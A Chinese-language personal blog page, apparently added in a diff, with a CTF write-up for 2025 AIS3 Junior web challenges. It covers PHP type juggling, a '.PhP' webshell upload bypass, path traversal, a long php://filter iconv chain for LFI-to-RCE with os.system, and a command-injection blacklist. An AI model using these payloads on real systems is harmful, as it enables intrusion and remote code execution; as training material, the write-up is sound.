@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html lang="zh-tw" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="phpisbest 進去後看到下面這些程式碼\n那可以用上課教的把他轉成陣列，這樣比較時就會變成弱比較，就會==0\nPayload:https://chall.nckuctf.org:28106/?A[]=1&amp;B[]=2\nFlag:NCKUCTF{php_15_7h3_8357_14n9u493}\nuploader-waf 一樣用一行php，但要繞過.php的限制，所以取.PhP\n然後在Burp改檔名把.png刪掉\n然後去讀檔並後面試試ls /\n最後cat%20/flag_NCA4jqt\n">
+
+<title>阿公のBlog</title><title>2025 AIS3 Junior 後端ㄉWriteup</title>
+
+<link rel='canonical' href='https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="2025 AIS3 Junior 後端ㄉWriteup">
+<meta property='og:description' content="phpisbest 進去後看到下面這些程式碼\n那可以用上課教的把他轉成陣列，這樣比較時就會變成弱比較，就會==0\nPayload:https://chall.nckuctf.org:28106/?A[]=1&amp;B[]=2\nFlag:NCKUCTF{php_15_7h3_8357_14n9u493}\nuploader-waf 一樣用一行php，但要繞過.php的限制，所以取.PhP\n然後在Burp改檔名把.png刪掉\n然後去讀檔並後面試試ls /\n最後cat%20/flag_NCA4jqt\n">
+<meta property='og:url' content='https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/'>
+<meta property='og:site_name' content='阿公のBlog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='2025' /><meta property='article:published_time' content='2025-08-18T00:00:00&#43;08:00'/><meta property='article:modified_time' content='2025-08-18T00:00:00&#43;08:00'/><meta property='og:image' content='https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png' />
+<meta name="twitter:title" content="2025 AIS3 Junior 後端ㄉWriteup">
+<meta name="twitter:description" content="phpisbest 進去後看到下面這些程式碼\n那可以用上課教的把他轉成陣列，這樣比較時就會變成弱比較，就會==0\nPayload:https://chall.nckuctf.org:28106/?A[]=1&amp;B[]=2\nFlag:NCKUCTF{php_15_7h3_8357_14n9u493}\nuploader-waf 一樣用一行php，但要繞過.php的限制，所以取.PhP\n然後在Burp改檔名把.png刪掉\n然後去讀檔並後面試試ls /\n最後cat%20/flag_NCA4jqt\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image.png' />
+    <link rel="shortcut icon" href="/img/new-avatar.PNG" />
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ELVEGJD750"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-ELVEGJD750');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2025 AIS3 Junior 後端ㄉWriteup",
+  "url": "https:\/\/agong88.github.io\/post\/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup\/",
+  "datePublished": "2025-08-18T00:00:00\u002b08:00",
+  "dateModified": "2025-08-18T00:00:00\u002b08:00",
+  
+  "image": "https:\/\/agong88.github.io\/image.png",
+  "keywords": "[2025]",
+  "inLanguage": "zh-tw",
+  "author": {
+    "@type": "Person",
+    "name": "",
+    "url": "https:\/\/agong88.github.io\/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": ""
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https:\/\/agong88.github.io\/post\/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup\/"
+  }
+}
+</script>
+
+
+
+<meta name="description" content="">
+<meta name="author" content="">
+
+<meta name="keywords" content="2025">
+
+
+
+<link rel="canonical" href="https://agong88.github.io/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/">
+
+
+
+<meta property="og:image" content="https://agong88.github.io/image.png">
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+
+<meta name="twitter:image" content="https://agong88.github.io/image.png">
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切換選單">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/new-avatar_hu_a21375ee9691e2f1.PNG" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🧑‍🦳</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">阿公のBlog</a></h1>
+            <h2 class="site-description">Hi, I&#39;m Chun-Hao Chung Welcome to my Blog</h2>
+        </div>
+    </header><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主頁</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%97%9C%E6%96%BC/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>關於</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>封存</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜尋</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E9%80%A3%E7%B5%90/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>連結</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://agong88.github.io/en/" >English</option>
+                                
+                                    <option value="https://agong88.github.io/" selected>中文</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>夜晚模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目錄</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#phpisbest">phpisbest</a></li>
+        <li><a href="#uploader-waf">uploader-waf</a></li>
+        <li><a href="#pathwalker-waf">Pathwalker Waf</a></li>
+        <li><a href="#lfi2rce">lfi2rce</a></li>
+        <li><a href="#dig-waf2">dig-waf2</a></li>
+        <li><a href="#login">login</a></li>
+        <li><a href="#sqli-unoin">sqli unoin</a></li>
+        <li><a href="#ssrf2">ssrf2</a></li>
+        <li><a href="#ssti-waf1">SSTI-waf1</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/">
+                <img src="/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image_hu_d049b218346d6bbd.png"
+                        srcset="/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image_hu_d049b218346d6bbd.png 800w, /post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/image_hu_6a54cc2eb60e44d.png 1600w"
+                        width="800" 
+                        height="428" 
+                        loading="lazy"
+                        alt="Featured image of post 2025 AIS3 Junior 後端ㄉWriteup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/security/" >
+                Security
+            </a>
+        
+            <a href="/categories/ais3/" >
+                AIS3
+            </a>
+        
+            <a href="/categories/writeup/" >
+                Writeup
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/2025-ais3-junior-%E5%BE%8C%E7%AB%AF%E3%84%89writeup/">2025 AIS3 Junior 後端ㄉWriteup</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 18, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    閱讀時間: 2 分鐘
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+        <footer class="article-translations">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+            <div>
+                
+                    <a href="https://agong88.github.io/en/post/2025-ais3-junior-web-back-end-writeup/" class="link">English</a>
+                
+            </div>
+        </footer>
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h3 id="phpisbest">phpisbest
+</h3><p>進去後看到下面這些程式碼<br>
+<img src="https://hackmd.io/_uploads/B1YY3MOOll.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+那可以用上課教的把他轉成陣列，這樣比較時就會變成弱比較，就會==0<br>
+Payload:<code>https://chall.nckuctf.org:28106/?A[]=1&amp;B[]=2</code><br>
+<img src="https://hackmd.io/_uploads/r1yGTfduxx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{php_15_7h3_8357_14n9u493}</code></p></blockquote>
+<h3 id="uploader-waf">uploader-waf
+</h3><p>一樣用一行php，但要繞過.php的限制，所以取.PhP<br>
+<img src="https://hackmd.io/_uploads/Skz-uGvOgg.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+然後在Burp改檔名把.png刪掉<br>
+<img src="https://hackmd.io/_uploads/BkbBoMw_xx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+然後去讀檔並後面試試<code>ls /</code><br>
+<img src="https://hackmd.io/_uploads/SkFp9fw_ll.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+最後<code>cat%20/flag_NCA4jqt</code><br>
+<img src="https://hackmd.io/_uploads/HJe1jMwdle.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{w385h311_15_4_427_4nd_m491c}</code></p></blockquote>
+<h3 id="pathwalker-waf">Pathwalker Waf
+</h3><p>進去後點咖波會說flag在<code>/var/www/html/flag.php</code><br>
+<img src="https://hackmd.io/_uploads/SyX6yQDuxe.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+先試試在<code>?page=</code>塞<code>../</code><br>
+<img src="https://hackmd.io/_uploads/Sy7mlXDuge.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+出現錯誤代碼了，再來一直塞<code>../</code>就好<br>
+<img src="https://hackmd.io/_uploads/S14Ux7vugg.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{p47h_724v32541_h45_4107_721ck}</code></p></blockquote>
+<h3 id="lfi2rce">lfi2rce
+</h3><p>進去後看到flag is in root dir<br>
+<img src="https://hackmd.io/_uploads/H1g3lXP_xx.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+手癢把cappo.php刪掉想看看會怎樣<br>
+<img src="https://hackmd.io/_uploads/HyWGZQP_ex.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+><br>
+出現錯誤代碼，那用上課教的<a class="link" href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT/blob/main/test.php"  target="_blank" rel="noopener"
+    >php偽協議</a><br>
+:::spoiler php偽協議<br>
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.CSISO99NAPLPS.CP902|convert.iconv.ISO-IR-143.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.PT154.874|convert.iconv.CSISO2022KR.UTF-32|convert.iconv.CSIBM901.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSA_T500.EUCJP-WIN|convert.iconv.CP855.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.ISO-10646/UTF-8|convert.iconv.BALTIC.SHIFT_JISX0213|convert.iconv.CP949.CP1361|convert.iconv.CSISOLATIN2.T.61|convert.iconv.IBM932.BIG-5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.NAPLPS.UCS-4|convert.iconv.ISO_8859-4.T.618BIT|convert.iconv.CSISO103T618BIT.BIG5-HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.iconv.OSF00010009.ISO2022JP2|convert.iconv.UTF16.ISO-10646/UTF-8|convert.iconv.UTF-16.UTF8|convert.iconv.ISO_8859-14:1998.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.BIGFIVE.CSIBM943|convert.iconv.LATIN6.WINDOWS-1258|convert.iconv.CP1258.CSISO103T618BIT|convert.iconv.NAPLPS.OSF10020359|convert.iconv.WINDOWS-1256.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-103.CSEUCPKDFMTJAPANESE|convert.iconv.OSF00010002.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.CSEUCKR.UTF-32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.CSISO90.UCS-4BE|convert.iconv.OSF00010004.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UK.852|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.iconv.ISO6937.UCS-2LE|convert.iconv.CP864.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-156.UNICODEBIG|convert.iconv.ISO885915.CSISO90|convert.iconv.ISO-IR-156.8859_9|convert.iconv.CSISOLATINGREEK.MSCP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.CSUCS4|convert.iconv.KOI8-T.CSIBM932|convert.iconv.CSIBM932.IBM866NAV|convert.iconv.IBM775.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UCS-4BE.855|convert.iconv.ISO88599.CSISO90|convert.iconv.ISO_6937:1992.10646-1:1993|convert.iconv.CP773.UNICODE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-156.OSF00010104|convert.iconv.CP860.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO-IR-6.ISO646-DE|convert.iconv.ISO2022KR.UTF32|convert.iconv.MAC-UK.ISO-10646|convert.iconv.UTF-32BE.MS936|convert.iconv.8859_5.UTF32|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP922.CSISOLATIN5|convert.iconv.ISO2022KR.UTF-32|convert.iconv.IBM912.ISO-IR-156|convert.iconv.ISO-IR-99.CSEUCPKDFMTJAPANESE|convert.iconv.8859_9.ISO_6937-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-GR.UNICODE|convert.iconv.ISO_8859-14:1998.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CP869.CSIBM1163|convert.iconv.ISO2022KR.UNICODE|convert.iconv.LATIN3.NAPLPS|convert.iconv.ISO-IR-90.UTF16LE|convert.iconv.IBM874.UNICODEBIG|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIGFIVE.UTF32|convert.iconv.WINSAMI2.T.61|convert.iconv.ISO-IR-103.ISO-IR-209|convert.iconv.8859_5.CSISO2022JP2|convert.iconv.ISO-2022-JP-3.IBM-943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.iconv.CSISO2022KR.UTF16|convert.iconv.LATIN6.CSUCS4|convert.iconv.UTF-32BE.ISO_6937-2:1983|convert.iconv.ISO-IR-111.CSWINDOWS31J|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd;<br>
+:::<br>
+最後在後面加上<code>1=os.system('')</code>就可以拿到webshell<br>
+<img src="https://hackmd.io/_uploads/r1FrcQuuel.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p><code>Flag:NCKUCTF{w385h311_15_4_427}</code></p></blockquote>
+<h3 id="dig-waf2">dig-waf2
+</h3><p>看到code知道ban了這些<br>
+<img src="https://hackmd.io/_uploads/BJJHdED_gl.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$blacklist = [&#39;|&#39;, &#39;&amp;&#39;, &#39;;&#39;, &#39;&gt;&#39;, &#39;&lt;&#39;, &#34;\n&#34;, &#34; &#34;, &#39;flag&#39;];
+</span></span></code></pre></td></tr></table>
+</div>
